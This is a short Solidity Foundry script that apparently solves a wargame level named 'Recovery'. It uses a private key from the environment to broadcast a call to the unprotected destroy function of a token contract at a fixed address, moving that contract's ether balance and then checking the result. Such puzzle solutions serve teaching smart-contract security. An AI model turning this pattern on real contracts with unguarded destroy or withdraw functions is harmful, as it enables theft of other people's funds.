pragma solidity ^0.8.0;
import "../instances/Ilevel17.sol";
import "forge-std/Test.sol";

contract Level17 is Test {
    Recovery level17 = Recovery(0xf97B327A90925D6F71ABfF554a85bcF3c737c31B);

    SimpleToken token =
        SimpleToken(payable(0x4739D82C393b40CF584f8a412C373F9cc2034F0e));

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        uint256 currentTokenBalance = address(token).balance;
        uint256 currentFactoryBalance = address(level17).balance;
        token.destroy(payable(address(level17)));
        require(
            address(level17).balance ==
                currentFactoryBalance + currentTokenBalance,
            "balance not correct"
        );
        vm.stopBroadcast();
    }
}
